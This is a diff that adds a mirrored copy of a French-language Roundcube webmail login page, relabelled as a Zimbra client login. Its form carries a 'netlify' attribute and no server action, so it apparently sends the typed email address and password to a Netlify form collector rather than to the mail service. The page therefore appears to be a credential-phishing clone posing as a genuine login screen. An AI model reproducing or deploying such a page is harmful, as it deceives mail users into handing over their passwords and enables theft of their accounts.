@@ -1,0 +1,108 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from webmail.w3z.co.uk/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Jun 2019 13:39:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<title>Bienvenue :: Connexion de Client </title>
+<link rel="index" href="https://webmail.w3z.co.uk/?_task=login" />
+<link rel="shortcut icon" href="https://webmail.w3z.co.uk/skins/classic/images/favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="https://webmail.w3z.co.uk/skins/classic/common.min.css?s=1554031676" />
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<link rel="stylesheet" type="text/css" href="https://webmail.w3z.co.uk/plugins/jqueryui/themes/classic/jquery-ui.css?s=1554031676">
+<script src="https://webmail.w3z.co.uk/program/js/jquery.min.js?s=1554031683" type="text/javascript"></script>
+<script src="https://webmail.w3z.co.uk/program/js/common.min.js?s=1554031676" type="text/javascript"></script>
+<script src="https://webmail.w3z.co.uk/program/js/app.min.js?s=1554031676" type="text/javascript"></script>
+<script src="https://webmail.w3z.co.uk/program/js/jstz.min.js?s=1554031684" type="text/javascript"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) 2005-2014 The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"fr_FR","devel_mode":null,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"classic","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","request_token":"KGwcUO9PdXHxSWyyxhz8VNxkxf2ZH8a9"});
+rcmail.add_label({"loading":"Chargement...","servererror":"Erreur de serveur !","connerror":"Erreur de connexion (n'a pu atteindre le serveur) !","requesttimedout":"D\u00e9lai de la requ\u00eate expir\u00e9","refreshing":"Actualisation...","windowopenerror":"La fen\u00eatre contextuelle a \u00e9t\u00e9 bloqu\u00e9e !","uploadingmany":"T\u00e9l\u00e9versement des fichiers...","close":"Fermer"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.gui_object('message', 'message');
+rcmail.gui_object('loginform', 'form');
+/* ]]> */
+</script>
+
+<script type="text/javascript" src="https://webmail.w3z.co.uk/plugins/jqueryui/js/jquery-ui.min.js?s=1554031676"></script>
+<script type="text/javascript" src="https://webmail.w3z.co.uk/plugins/jqueryui/js/i18n/jquery.ui.datepicker-fr.js?s=1554031676"></script>
+</head>
+<body>
+
+<img src="" id="logo" border="0" style="margin:0 11px" alt="">
+
+<div id="message"></div>
+
+<div id="login-form">
+<div class="boxtitle">Connexion de Client Web Zimbra</div>
+<div class="boxcontent">
+
+<form name="form" method="post" netlify>
+<input type="hidden" name="_token" value="KGwcUO9PdXHxSWyyxhz8VNxkxf2ZH8a9">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table summary="" border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Email</label>
+</td>
+<td class="input"><input name="_user" id="rcmloginuser" required="required" autocapitalize="off" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">PASS</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required="required" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="ENTRER"></p>
+
+</form>
+
+</div>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Avertissement : Ce service de courriel Web exige Javascript ! Afin de l'utiliser, veuillez activer Javascript dans les paramètres de votre navigateur.</p>
+</noscript>
+
+<div id="login-bottomline">
+  Client Webmail 
+    
+</div>
+
+
+
+<script type="text/javascript">
+/* <![CDATA[ */
+
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/classic\/images\/icons\/folders.png","https://webmail.w3z.co.uk/skins\/classic\/images\/mail_footer.png","https://webmail.w3z.co.uk/skins\/classic\/images\/taskicons.gif","https://webmail.w3z.co.uk/skins\/classic\/images\/display\/loading.gif","https://webmail.w3z.co.uk/skins\/classic\/images\/pagenav.gif","https://webmail.w3z.co.uk/skins\/classic\/images\/mail_toolbar.png","https://webmail.w3z.co.uk/skins\/classic\/images\/searchfield.gif","https://webmail.w3z.co.uk/skins\/classic\/images\/messageicons.png","https://webmail.w3z.co.uk/skins\/classic\/images\/icons\/reset.gif","https://webmail.w3z.co.uk/skins\/classic\/images\/abook_toolbar.png","https://webmail.w3z.co.uk/skins\/classic\/images\/icons\/groupactions.png","skins\/classic\/images\/watermark.gif"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+/* ]]> */
+</script>
+
+</body>
+
+<!-- Mirrored from webmail.w3z.co.uk/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Jun 2019 13:39:01 GMT -->
+</html>
